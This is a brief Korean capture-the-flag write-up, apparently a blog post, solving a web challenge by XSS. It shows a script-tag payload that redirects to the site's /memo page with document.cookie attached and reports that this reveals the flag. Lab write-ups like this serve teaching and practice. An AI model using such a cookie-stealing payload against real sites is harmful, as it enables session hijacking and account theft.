<img src="https://velog.velcdn.com/images/silvergun8291/post/12c1903c-92cb-4055-9fd9-6b086a16ac40/image.png">

문제 사이트에 접속하면 3개의 연결된 페이지들의 목록이 나옵니다.

#

![](https://velog.velcdn.com/images/silvergun8291/post/214fb9f1-1837-4480-9b4c-b69af70254fc/image.png)

flag 페이지로 들어가면 입력창이 떠서 XSS 공격을 시도해볼 수 있습니다.

<br>

```html
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

script 태그를 이용해서 XSS 공격을 시도해 보면

#

<img src="https://velog.velcdn.com/images/silvergun8291/post/bfe59d5d-23da-48e2-99a7-92c22373df13/image.png">

공격이 성공해서 FLAG가 출력되었습니다.


